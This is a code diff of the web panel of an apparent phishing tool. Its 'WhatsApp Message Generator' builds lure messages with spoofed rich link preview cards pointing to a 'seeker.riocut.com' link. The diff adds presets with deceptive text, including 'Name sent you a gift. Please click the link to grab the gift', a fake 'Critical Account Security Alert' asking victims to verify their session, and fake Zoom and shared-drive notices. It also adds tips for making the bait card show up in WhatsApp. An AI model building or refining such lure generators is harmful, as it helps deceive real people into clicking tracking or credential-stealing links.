@@ -1178,12 +1178,12 @@
             <div class="space-y-2.5">
               <div>
                 <label class="block text-slate-300 text-[11px] font-medium mb-1">Headline / Subject (Bold)</label>
-                <input type="text" id="waCustomTitle" oninput="updateWAMessages()" value="Project Documents & Asset Review" placeholder="e.g. Project Documents & Asset Review" class="w-full bg-surface-900 border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-emerald-500 font-medium">
+                <input type="text" id="waCustomTitle" oninput="updateWAMessages()" value="Name sent you a gift." placeholder="e.g. Name sent you a gift." class="w-full bg-surface-900 border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-emerald-500 font-medium">
               </div>
 
               <div>
                 <label class="block text-slate-300 text-[11px] font-medium mb-1">Message Description / Note</label>
-                <textarea id="waCustomDesc" oninput="updateWAMessages()" rows="2" placeholder="Please review the attached project files at the link below:" class="w-full bg-surface-900 border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-emerald-500 resize-none leading-relaxed">Please review the attached project files at the link below:</textarea>
+                <textarea id="waCustomDesc" oninput="updateWAMessages()" rows="2" placeholder="Please click the link to grab the gift." class="w-full bg-surface-900 border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-emerald-500 resize-none leading-relaxed">Please click the link to grab the gift.</textarea>
               </div>
 
               <div>
@@ -1219,8 +1219,8 @@
 
             <!-- Image URL Input -->
             <div>
-              <label class="block text-slate-300 text-[11px] font-medium mb-1">Image URL (Direct link to photo)</label>
-              <input type="text" id="waCustomImageUrl" oninput="handleWAImageUrlInput()" placeholder="https://... (or choose/upload below)" class="w-full bg-surface-900 border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-emerald-500 font-mono">
+              <label class="block text-slate-300 text-[11px] font-medium mb-1">Image URL (Direct link to photo - 1200x630)</label>
+              <input type="text" id="waCustomImageUrl" oninput="handleWAImageUrlInput()" value="https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=1200&h=630&fit=crop" placeholder="https://... (or choose/upload below)" class="w-full bg-surface-900 border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-emerald-500 font-mono">
             </div>
 
             <!-- Upload Area & Presets -->
@@ -1240,21 +1240,21 @@
 
               <!-- Presets -->
               <div>
-                <span class="text-[10px] text-slate-500 block mb-1.5 font-medium">Quick Presets:</span>
+                <span class="text-[10px] text-slate-500 block mb-1.5 font-medium">Quick Presets (Sets Headline, Note & Photo):</span>
                 <div class="grid grid-cols-5 gap-1.5">
-                  <button type="button" onclick="setWAPresetImage('gift')" class="wa-preset-btn p-1.5 rounded-lg border border-slate-700 bg-surface-900 hover:border-emerald-500 text-[10px] text-slate-300 transition text-center truncate">
+                  <button type="button" id="waPresetBtn_gift" onclick="setWAPreset('gift')" class="wa-preset-btn p-1.5 rounded-lg border border-emerald-500 bg-emerald-950/40 text-[10px] text-emerald-300 transition text-center truncate font-medium">
                     🎁 Gift
                   </button>
-                  <button type="button" onclick="setWAPresetImage('doc')" class="wa-preset-btn p-1.5 rounded-lg border border-slate-700 bg-surface-900 hover:border-emerald-500 text-[10px] text-slate-300 transition text-center truncate">
+                  <button type="button" id="waPresetBtn_doc" onclick="setWAPreset('doc')" class="wa-preset-btn p-1.5 rounded-lg border border-slate-700 bg-surface-900 hover:border-emerald-500 text-[10px] text-slate-300 transition text-center truncate">
                     📄 Document
                   </button>
-                  <button type="button" onclick="setWAPresetImage('cloud')" class="wa-preset-btn p-1.5 rounded-lg border border-slate-700 bg-surface-900 hover:border-emerald-500 text-[10px] text-slate-300 transition text-center truncate">
+                  <button type="button" id="waPresetBtn_cloud" onclick="setWAPreset('cloud')" class="wa-preset-btn p-1.5 rounded-lg border border-slate-700 bg-surface-900 hover:border-emerald-500 text-[10px] text-slate-300 transition text-center truncate">
                     ☁️ Cloud
                   </button>
-                  <button type="button" onclick="setWAPresetImage('meeting')" class="wa-preset-btn p-1.5 rounded-lg border border-slate-700 bg-surface-900 hover:border-emerald-500 text-[10px] text-slate-300 transition text-center truncate">
+                  <button type="button" id="waPresetBtn_meeting" onclick="setWAPreset('meeting')" class="wa-preset-btn p-1.5 rounded-lg border border-slate-700 bg-surface-900 hover:border-emerald-500 text-[10px] text-slate-300 transition text-center truncate">
                     📹 Meeting
                   </button>
-                  <button type="button" onclick="setWAPresetImage('security')" class="wa-preset-btn p-1.5 rounded-lg border border-slate-700 bg-surface-900 hover:border-emerald-500 text-[10px] text-slate-300 transition text-center truncate">
+                  <button type="button" id="waPresetBtn_security" onclick="setWAPreset('security')" class="wa-preset-btn p-1.5 rounded-lg border border-slate-700 bg-surface-900 hover:border-emerald-500 text-[10px] text-slate-300 transition text-center truncate">
                     🛡️ Security
                   </button>
                 </div>
@@ -1284,6 +1284,14 @@
             </div>
 
             <textarea id="waFinalCopyText" readonly rows="3" class="w-full bg-surface-950 border border-slate-800 rounded-xl p-3 font-mono text-[11px] text-emerald-300 resize-none focus:outline-none"></textarea>
+
+            <!-- Important Link Preview Tip -->
+            <div class="p-2.5 rounded-xl bg-amber-500/10 border border-amber-500/25 text-amber-300 text-[11px] flex items-start space-x-2">
+              <i data-lucide="info" class="w-4 h-4 shrink-0 text-amber-400 mt-0.5"></i>
+              <div class="leading-relaxed">
+                <span class="font-bold text-amber-200">How to get the photo card in WhatsApp:</span> When you paste this message into WhatsApp, <b>wait 2–3 seconds</b> until the photo thumbnail card appears above your input box <i>before</i> pressing Send! If you tap Send instantly, WhatsApp will send plain text without the card.
+              </div>
+            </div>
 
             <div class="flex items-center justify-between flex-wrap gap-2 pt-1">
               <button onclick="copyFinalWAMessage()" class="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl text-xs font-bold transition flex items-center space-x-2 shadow-lg shadow-emerald-600/25">
@@ -1352,7 +1360,7 @@
                 <!-- 1) PHOTO ATTACHMENT MODE VIEW -->
                 <div id="waPhotoAttachmentView" class="hidden space-y-1.5">
                   <div class="rounded-lg overflow-hidden bg-black/40 relative aspect-video flex items-center justify-center max-h-[160px]">
-                    <img id="waPreviewImgPhoto" crossOrigin="anonymous" src="https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=600" alt="Preview Image" class="w-full h-full object-cover">
+                    <img id="waPreviewImgPhoto" crossOrigin="anonymous" src="https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=1200&h=630&fit=crop" alt="Preview Image" class="w-full h-full object-cover">
                   </div>
                   <div class="px-1 space-y-0.5">
                     <div id="waPhotoTitle" class="font-bold text-white text-[12px] leading-tight">Name sent you a gift.</div>
@@ -1366,7 +1374,7 @@
                   <!-- Nested Link Preview Box (WhatsApp standard rich link card) -->
                   <div class="bg-[#024436]/90 border border-white/10 rounded-lg overflow-hidden flex flex-col">
                     <div class="w-full h-32 bg-black/30 overflow-hidden relative">
-                      <img id="waPreviewImgCard" crossOrigin="anonymous" src="https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=600" alt="Card Image" class="w-full h-full object-cover">
+                      <img id="waPreviewImgCard" crossOrigin="anonymous" src="https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=1200&h=630&fit=crop" alt="Card Image" class="w-full h-full object-cover">
                       <span class="absolute bottom-1.5 left-2 bg-black/60 backdrop-blur-sm text-slate-300 text-[9px] px-1.5 py-0.5 rounded font-mono">seeker.riocut.com</span>
                     </div>
                     <div class="p-2 space-y-0.5">
@@ -3659,16 +3667,44 @@
     });
 
     // WhatsApp Message Generator modal functions
-    const WA_PRESET_IMAGES = {
-      gift: 'https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=600',
-      doc: 'https://images.unsplash.com/photo-1568667256549-094345857637?w=600',
-      cloud: 'https://images.unsplash.com/photo-1544197150-b99a580bb7a8?w=600',
-      meeting: 'https://images.unsplash.com/photo-1588196749597-9ff075ee6b5b?w=600',
-      security: 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600',
-      default: 'https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=600'
+    const WA_PRESETS = {
+      gift: {
+        title: 'Name sent you a gift.',
+        desc: 'Please click the link to grab the gift.',
+        image: 'https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=1200&h=630&fit=crop'
+      },
+      doc: {
+        title: 'Project Documents & Asset Review',
+        desc: 'Please review the attached project files at the link below:',
+        image: 'https://images.unsplash.com/photo-1568667256549-094345857637?w=1200&h=630&fit=crop'
+      },
+      cloud: {
+        title: 'Shared Drive File Transfer',
+        desc: 'A private file has been shared with you. Click to download.',
+        image: 'https://images.unsplash.com/photo-1544197150-b99a580bb7a8?w=1200&h=630&fit=crop'
+      },
+      meeting: {
+        title: 'Zoom Video Conference Invitation',
+        desc: 'Join the scheduled meeting room using the link below.',
+        image: 'https://images.unsplash.com/photo-1588196749597-9ff075ee6b5b?w=1200&h=630&fit=crop'
+      },
+      security: {
+        title: 'Critical Account Security Alert',
+        desc: 'Unrecognized sign-in attempt detected. Verify your session.',
+        image: 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=1200&h=630&fit=crop'
+      }
     };
 
-    let currentWAImageSrc = WA_PRESET_IMAGES.gift;
+    const WA_PRESET_IMAGES = {
+      gift: WA_PRESETS.gift.image,
+      doc: WA_PRESETS.doc.image,
+      cloud: WA_PRESETS.cloud.image,
+      meeting: WA_PRESETS.meeting.image,
+      security: WA_PRESETS.security.image,
+      default: WA_PRESETS.gift.image
+    };
+
+    let currentWAImageSrc = WA_PRESETS.gift.image;
     let currentWAPreviewMode = 'card';
 
     window.setWAPreviewMode = function(mode) {
@@ -3713,36 +3749,19 @@
         timeSpan.textContent = new Date().toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' });
       }
 
-      // Populate default title based on selected template if available
-      const tplSelect = document.getElementById('modalTemplateSelect');
       const titleInput = document.getElementById('waCustomTitle');
+      const descInput = document.getElementById('waCustomDesc');
       const imgInput = document.getElementById('waCustomImageUrl');
 
-      if (imgInput && !imgInput.value) {
-        imgInput.value = currentWAImageSrc;
+      if (titleInput && (!titleInput.value || titleInput.value.includes('Project Documents'))) {
+        titleInput.value = WA_PRESETS.gift.title;
       }
-
-      if (tplSelect && titleInput) {
-        const val = tplSelect.value;
-        if (val === '6' && document.getElementById('param_custom_og_title')) {
-          const ogVal = document.getElementById('param_custom_og_title').value;
-          if (ogVal) titleInput.value = ogVal;
-        } else if (val === '3') {
-          titleInput.value = 'Zoom Meeting Invitation';
-        } else if (val === '4') {
-          titleInput.value = 'Google Security Verification';
-        } else if (val === '1') {
-          titleInput.value = 'WhatsApp Group Invite';
-        } else if (val === '2') {
-          // If WhatsApp template active, check if custom title was set
-          const activeTitle = document.getElementById('param_title')?.value;
-          if (activeTitle) titleInput.value = activeTitle;
-          const activeImg = document.getElementById('param_image')?.value;
-          if (activeImg) {
-            currentWAImageSrc = activeImg;
-            if (imgInput) imgInput.value = activeImg;
-          }
-        }
+      if (descInput && (!descInput.value || descInput.value.includes('project files'))) {
+        descInput.value = WA_PRESETS.gift.desc;
+      }
+      if (imgInput && (!imgInput.value || imgInput.value.includes('w=600'))) {
+        imgInput.value = WA_PRESETS.gift.image;
+        currentWAImageSrc = WA_PRESETS.gift.image;
       }
 
       updateWAMessages();
@@ -3796,21 +3815,38 @@
       reader.readAsDataURL(file);
     };
 
-    window.setWAPresetImage = function(type) {
-      const url = WA_PRESET_IMAGES[type] || WA_PRESET_IMAGES.default;
-      currentWAImageSrc = url;
+    window.setWAPreset = function(type) {
+      const preset = WA_PRESETS[type] || WA_PRESETS.gift;
+      currentWAImageSrc = preset.image;
+
+      const titleInput = document.getElementById('waCustomTitle');
+      const descInput = document.getElementById('waCustomDesc');
       const imgInput = document.getElementById('waCustomImageUrl');
-      if (imgInput) imgInput.value = url;
+
+      if (titleInput) titleInput.value = preset.title;
+      if (descInput) descInput.value = preset.desc;
+      if (imgInput) imgInput.value = preset.image;
+
+      // Update button highlight styles
+      document.querySelectorAll('.wa-preset-btn').forEach(b => {
+        b.className = 'wa-preset-btn p-1.5 rounded-lg border border-slate-700 bg-surface-900 hover:border-emerald-500 text-[10px] text-slate-300 transition text-center truncate';
+      });
+      const activeBtn = document.getElementById(`waPresetBtn_${type}`);
+      if (activeBtn) {
+        activeBtn.className = 'wa-preset-btn p-1.5 rounded-lg border border-emerald-500 bg-emerald-950/40 text-[10px] text-emerald-300 font-medium transition text-center truncate shadow-sm';
+      }
+
       updateWAMessages();
-      showToast(`Selected ${type} preview photo`, 'info');
+      showToast(`Selected ${type} preset (Title, Note & Photo updated)`, 'info');
+    };
+
+    window.setWAPresetImage = function(type) {
+      setWAPreset(type);
     };
 
     window.resetWAImage = function() {
-      currentWAImageSrc = WA_PRESET_IMAGES.default;
-      const imgInput = document.getElementById('waCustomImageUrl');
-      if (imgInput) imgInput.value = currentWAImageSrc;
-      updateWAMessages();
-      showToast('Reset to default photo', 'info');
+      setWAPreset('gift');
+      showToast('Reset to Gift preset photo & text', 'info');
     };
 
     window.updateWAMessages = function() {
@@ -3820,9 +3856,9 @@
         const sep = link.includes('?') ? '&' : '?';
         link = `${link}${sep}v=${Date.now().toString().slice(-4)}`;
       }
-      const title = (document.getElementById('waCustomTitle')?.value || 'Name sent you a gift.').trim();
-      const desc = (document.getElementById('waCustomDesc')?.value || 'Please click the link to grab the gift.').trim();
-      const imgUrl = (document.getElementById('waCustomImageUrl')?.value || currentWAImageSrc || WA_PRESET_IMAGES.default).trim();
+      const title = (document.getElementById('waCustomTitle')?.value || WA_PRESETS.gift.title).trim();
+      const desc = (document.getElementById('waCustomDesc')?.value || WA_PRESETS.gift.desc).trim();
+      const imgUrl = (document.getElementById('waCustomImageUrl')?.value || currentWAImageSrc || WA_PRESETS.gift.image).trim();
 
       // Update Live WhatsApp Images
       const imgCard = document.getElementById('waPreviewImgCard');
@@ -3862,9 +3898,9 @@
       const originalText = btn ? btn.textContent : '';
       if (btn) btn.textContent = 'Applying to Live Server...';
 
-      const title = (document.getElementById('waCustomTitle')?.value || 'WhatsApp Group Invite').trim();
-      const desc = (document.getElementById('waCustomDesc')?.value || 'Please click the link to join').trim();
-      const image = (document.getElementById('waCustomImageUrl')?.value || currentWAImageSrc || WA_PRESET_IMAGES.default).trim();
+      const title = (document.getElementById('waCustomTitle')?.value || WA_PRESETS.gift.title).trim();
+      const desc = (document.getElementById('waCustomDesc')?.value || WA_PRESETS.gift.desc).trim();
+      const image = (document.getElementById('waCustomImageUrl')?.value || currentWAImageSrc || WA_PRESETS.gift.image).trim();
 
       try {
         const payload = {
